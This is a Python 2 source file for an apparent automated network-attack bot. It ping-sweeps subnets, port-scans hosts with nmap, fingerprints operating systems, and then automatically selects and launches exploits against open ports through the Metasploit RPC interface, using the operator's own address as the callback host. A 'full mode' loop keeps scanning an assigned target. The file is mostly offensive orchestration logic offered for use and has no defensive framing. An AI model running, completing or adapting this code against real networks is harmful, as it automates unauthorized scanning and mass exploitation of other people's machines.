import nmap, pxssh, mrpc_module
import os, msfrpc, sys, subprocess

import leftTop_frame
import leftBottom_frame

from time import *
import socket

import mrpc_module
import exploits 
from threading import Thread
from multiprocessing import Process
import msfrpca 

from global_variables import *

printB = leftBottom_frame.print_bottom_panel

class Bot:
	def __init__(self, id):
		self.myhost_address = HOST_IP_ADDRESS
		self.targetHost = {}
		self.record = []
		self.id = str(id)
		self.busy = False
		self.exploit_num = 0
		self.status = "SLEEPING"
		self.full_mode_record = []
		self.logs = ''
		self.ssh = None
		self.msfconsole = msfrpca.MConsole()
		self.msfconsole.console_create()

	def connect(self, host, user, password):
		try:
			s = pxssh.pxssh()
			s.login(host, user, password)
			self.ssh = s
		except Exception, e:
			print e
			print '[-] Error Connecting'
	
	def send_command(self, cmd):
		self.ssh.sendline(cmd)
		self.ssh.prompt()
		return self.ssh.before

	def scan_subnet_port(self, subNet, port):
		nmScan = nmap.PortScanner()
		nmScan.scan(subNet, port)
		tgtHosts = []
		for host in nmScan.all_hosts():
			if nmScan[host].has_tcp(445):
				state = nmScan[host]['tcp'][445]['state']
			if state == 'open':
				tgtHosts.append(host)

		self.targetHost = tgtHosts

	def protect(self, host):
		print "[+] Works."


	def ping_sweep(self, subnet):
		#subnet => '192.168.1.0/30'
		scanTime = strftime("%H:%M:%S", gmtime()) 
		import __builtin__
		from network import hosts
		from pprint import pprint

		subnet_hosts = []
		list_of_hosts_created = hosts.get_hosts()
		count = 0

		nma = nmap.PortScanner() 

		print nma.scan(hosts=subnet, arguments='-sP')

		hosts_list = [(x, nma[x]['status']['state'], nma[x]['hostname']) for x in nma.all_hosts()]

		# from pprint import pprint
		# pprint(nma)
		# print hosts_list


 		for host, status, hostname in hosts_list:
 			if status == 'up' or hostname != '':
 					hosts.create_host(host, hostname=hostname)

 		msg = str(scanTime)+" => Ping sweeped " + subnet
		self.record.append(msg)

		leftBottom_frame.print_bottom_panel("[+] Finished Ping Sweep ")

	def scan(self, host, port, port_name):
		address = host.address
		nmScan = nmap.PortScanner()
		nmScan.scan(address, port)

		try:
			state = nmScan[address]['tcp'][int(port)]['state']

			if state == "open":
				self.targetHost['ports'].append(port)
				host.openPorts.append(port)

			msg = ("[*] " + address + 
						 " tcp/" + port + 
						 " "+port_name+ " " + state)

			pprint(nmScan)
			#leftBottom_frame.print_bottom_panel(msg)
			return
		except:
			pass

		#leftBottom_frame.print_bottom_panel("[!] Error scanning host " + host.address)


	def start_ping(self, address):
		from pprint import pprint

		nmScan = nmap.PortScanner()
		t = nmScan.scan(address, arguments='-sP')

		pprint (vars(nmScan))

		status = t['scan'][address]['status']['state']
		bool_status = False

		if status == 'up':
			bool_status = True
			#printB("[+] Host "+address+" is "+status+".")
		#else:
			#printB("[-] Host "+address+" is "+status+".")

		return bool_status

	def scan_one_host_ports(self, host, tgtPorts):
		from pprint import pprint

		scanTime = strftime("%H:%M:%S", gmtime()) 
		self.host = host
		address =  host.address

		nmScan = nmap.PortScanner()
		self.targetHost = { 'id': host.id, 'ip': address, 'ports':[]}
		host.scanned = True
		host.openPorts = []

		threads = []

		#-------------- PING RECON ---------------
		# if self.start_ping(address) == "up":

		#--------------OS DETECTION---------------
		def start_os_recon():
			 try:
			 	nmScan.scan(address, arguments="-O")
			 	pprint(nmScan[address])
			 	return
			 except:
			 	pass
			 printB("[!] Os recognition failed.")


		t = Thread(target=start_os_recon, args=()) 
		threads.append(t)
		t.start()

		#-------------- PORT SCAN-----------------

		for port in tgtPorts.keys():
			t = Thread(target=self.scan, args=(host, port, tgtPorts[port]))
			threads.append(t)
			t.start()

		# Wait for all of them to finish
		[x.join() for x in threads]

		hosts_list = [(x, nmScan[x]['status']['state']) for x in nmScan.all_hosts()]

		for addr, status in hosts_list:
			if addr == address:
			#-------------- SAVING RECORDS -----------
				if nmScan[address].has_key('osclass'):
						for osclass in nmScan[address]['osclass']:
								host.os_type = osclass['type']
								host.os_vendor = osclass['vendor']
								host.os_family = osclass['osfamily']
								host.os_gen = osclass['osgen']
								host.os_accuracy = osclass['accuracy']

				msg = str(scanTime)+" => Scanned host: " + str(host.id)

				self.record.append(msg)
		leftBottom_frame.print_bottom_panel("[+]Finished Scan.")  

		# else:
		#   printB("[-]Host:" + str(host.id) + "is down or has a firewall up.")

	def exploit(self, exploit_name, host, lhost, lport):
		printB("[+] Exploiting : "+exploit_name)
		mrpc_module.get_exploit(self, exploit_name, host, lhost, lport)

	def exploit_all_host(self, host):
		scanTime = strftime("%H:%M:%S", gmtime())
		print host.openPorts

		if host.scanned:
			for port in host.openPorts:
				if self.busy == False:
					options = exploits.searchExploits(host.os_family, port, self.id, host.id)
					for attack in options:
						printB(attack['message'])
						self.exploit(attack['exploit_name'], host, self.myhost_address, port)
						self.record.append(attack['record'])
				else:
					printB("[-] Busy Bot")

		else:
			printB("[!] Host not scanned.")
				

	def assign(self, host, tgtPorts):
		if host.bot_assigned == -1 or host.bot_assigned == self.id:
			self.status = "ASSIGNED"
			if host.scanned:
				self.exploit_all_host(host)
			else:
				self.scan_one_host_ports(host, tgtPorts)
				self.exploit_all_host(host)
		else:
			leftBottom_frame.print_bottom_panel("[!] Host " + str(host.id) + 
																					" is already assigned to BOT " + str(host.bot_assigned))  

	'''
		FULL MODE SECTION OF BOT
			* BOT WILL SCAN, ATTACK, AND SECURE BOT.
	'''

	def full_mode(self, host, PORTS):
		if host.bot_assigned == -1 or host.bot_assigned == self.id:
			self.status = "PERMANENT ASSIGNMENT"
			self.targetHost = { 'id':host.id, 'ip': host.address, 'ports':[]}
			host.bot_assigned = self.id

			self.full_mode_os_recognition(host, PORTS)

			self.full_mode_module(host, PORTS)

		else:
			leftBottom_frame.print_bottom_panel("[!] Host " + str(host.id) + 
																					" is already assigned to BOT " + str(host.bot_assigned))

	def full_mode_module(self, host, PORTS):
		# print host.bot_assigned 
		# print self.id
		# print STATUS['3']
		if host.bot_assigned == self.id and self.status == STATUS['3']:
			try:
				self.full_mode_scan_host_ports(host, PORTS)
				# attack
				# secure
				sleep(5)
				print "finished"
				self.full_mode_module(host, PORTS)
			except Exception,e: 
				print str(e)
				pass

	def continue_full_mode(self, host, PORTS):
		t=Thread(target=self.full_mode_module, args=(host, PORTS))
		t.daemon=True
		t.start()

	def full_mode_os_recognition(self, host, tgtPorts):
		scanTime = strftime("%H:%M:%S", gmtime()) 
		self.host = host
		address =  host.address

		nmScan = nmap.PortScanner()
		nmScan.scan(address, arguments="-O")

		if nmScan[address].has_key('osclass'):
				for osclass in nmScan[address]['osclass']:
						host.os_type = osclass['type']
						host.os_vendor = osclass['vendor']
						host.os_family = osclass['osfamily']
						host.os_gen = osclass['osgen']
						host.os_accuracy = osclass['accuracy']

		msg = str(scanTime)+" => host recognition finished: " + str(host.id)

		self.full_mode_record.append(msg)

	def full_mode_scan_host_port(self, host, port, port_name):
		try:
			address = host.address
			nmScan = nmap.PortScanner()
			nmScan.scan(address, port)
			state = nmScan[address]['tcp'][int(port)]['state']

			if state == "open":
				if port not in host.openPorts:
					self.targetHost['ports'].append(port)
					host.openPorts.append(port)
		except:
			pass

	def full_mode_scan_host_ports(self, host, tgtPorts):
		scanTime = strftime("%H:%M:%S", gmtime()) 
		self.host = host
		address =  host.address

		nmScan = nmap.PortScanner()
		host.scanned = True

		threads = []

		for port in tgtPorts.keys():
			t = Thread(target=self.full_mode_scan_host_port, args=(host, port, tgtPorts[port]))
			threads.append(t)
			t.start()

		# Wait for all of them to finish
		[x.join() for x in threads]

		msg = str(scanTime)+" => Scanned host: " + str(host.id)

		self.full_mode_record.append(msg)
